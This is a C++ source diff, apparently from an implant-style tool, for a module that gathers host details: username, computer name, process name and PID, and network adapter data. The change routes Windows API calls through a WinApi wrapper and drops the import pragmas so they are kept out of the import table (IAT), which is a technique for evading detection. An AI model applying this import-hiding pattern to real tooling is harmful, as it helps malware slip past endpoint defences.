@@ -6,7 +6,7 @@
 #include "metadata.h"
 #include <lmcons.h> // Contains UNLEN (Maximum username length)
 #include <filesystem>
-
+#include "../defense/winapi.h"
 //placeholder, move me to a diff file later, that has the ability to get this data
 //void populate_metadata(std::map<std::string, std::string>& metadata) {
 //    // Hardcoded placeholders as requested
@@ -57,7 +57,7 @@ ModuleResult get_current_user() {
 	DWORD size = UNLEN + 1;
 
 	// GetUserNameW returns non-zero on success
-	if (GetUserNameW(buffer, &size)) {
+	if (WinApi::GetUserNameW(buffer, &size)) {
 		// use filesystem::path to handle the Wide to Narrow conversion safely
 		// old method ofstd::string username_buffer(w_username_buffer.begin(), w_username_buffer.end()); could result in char corruption
 		std::filesystem::path converter(buffer);
@@ -65,7 +65,7 @@ ModuleResult get_current_user() {
 	}
 
 	//on fail return blank
-	return { "", GetLastError() };
+	return { "", WinApi::GetLastError() };
 }
 
 ModuleResult get_computer_name() {
@@ -73,24 +73,24 @@ ModuleResult get_computer_name() {
 	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
 
-	if (GetComputerNameW(buffer, &size)) {
+	if (WinApi::GetComputerNameW(buffer, &size)) {
 		// use filesystem::path to handle the Wide to Narrow conversion safely
 		// old method of std::string computer_name_buffer(w_computer_name_buffer.begin(), w_computer_name_buffer.end()); could result in char corruption
 		std::filesystem::path converter(buffer);
 		return { converter.string(), ERROR_SUCCESS };
 	}
 
-	return { "", GetLastError() };
+	return { "", WinApi::GetLastError() };
 }
 
 ModuleResult get_current_process_name() {
 	// 32767 is the approx max length for "\\?\" extended paths.
 	std::vector<wchar_t> buffer(32767);
 
-	DWORD length = GetModuleFileNameW(NULL, &buffer[0], buffer.size());
+	DWORD length = WinApi::GetModuleFileNameW(NULL, &buffer[0], buffer.size());
 
 	if (length == 0) {
-		return { "", GetLastError() };
+		return { "", WinApi::GetLastError() };
 	}
 
 	// Check if buffer was too small
@@ -112,11 +112,11 @@ ModuleResult get_current_process_name() {
 ModuleResult get_current_process_pid() {
 	std::vector<wchar_t> buffer(32767);
 
-	DWORD pid = GetCurrentProcessId();
+	DWORD pid = WinApi::GetCurrentProcessId();
 
 
 	if (pid == 0) {
-		return { "", GetLastError() };
+		return { "", WinApi::GetLastError() };
 	}
 
 	std::string s_pid = std::to_string(pid);
@@ -129,8 +129,9 @@ ModuleResult get_current_process_pid() {
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
 #include "../protocols/json/json.h"
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "ws2_32.lib")
+//NO PRAGMA, it includes in IAT
+//#pragma comment(lib, "iphlpapi.lib")
+//#pragma comment(lib, "ws2_32.lib")
 
 ModuleResult get_nic_info() {
     //return { "0.1.3.4", ERROR_SUCCESS };
@@ -143,12 +144,12 @@ ModuleResult get_nic_info() {
         return { nlohmann::json::object(), ERROR_NOT_ENOUGH_MEMORY };
     }
 
-    DWORD dwRetVal = GetAdaptersAddresses(family, flags, NULL, adapters, &bufferSize);
+    DWORD dwRetVal = WinApi::GetAdaptersAddresses(family, flags, NULL, adapters, &bufferSize);
 
     if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
         free(adapters);
         adapters = (IP_ADAPTER_ADDRESSES*)malloc(bufferSize);
-        dwRetVal = GetAdaptersAddresses(family, flags, NULL, adapters, &bufferSize);
+        dwRetVal = WinApi::GetAdaptersAddresses(family, flags, NULL, adapters, &bufferSize);
     }
 
     nlohmann::json network_dict = nlohmann::json::object();
@@ -176,7 +177,7 @@ ModuleResult get_nic_info() {
                 if (ga->Address.lpSockaddr->sa_family == AF_INET) {
                     char gwIp[INET_ADDRSTRLEN];
                     sockaddr_in* gw_ipv4 = (sockaddr_in*)ga->Address.lpSockaddr;
-                    inet_ntop(AF_INET, &gw_ipv4->sin_addr, gwIp, sizeof(gwIp));
+                    WinApi::inet_ntop(AF_INET, &gw_ipv4->sin_addr, gwIp, sizeof(gwIp));
                     gatewayStr = gwIp;
                     break; // Just grab the first IPv4 gateway
                 }
@@ -187,7 +188,7 @@ ModuleResult get_nic_info() {
                 if (ua->Address.lpSockaddr->sa_family == AF_INET) {
                     char ipStr[INET_ADDRSTRLEN];
                     sockaddr_in* ipv4 = (sockaddr_in*)ua->Address.lpSockaddr;
-                    inet_ntop(AF_INET, &ipv4->sin_addr, ipStr, sizeof(ipStr));
+                    WinApi::inet_ntop(AF_INET, &ipv4->sin_addr, ipStr, sizeof(ipStr));
 
                     // Add to dictionary with the IP as the key
                     network_dict[macBuf] = {
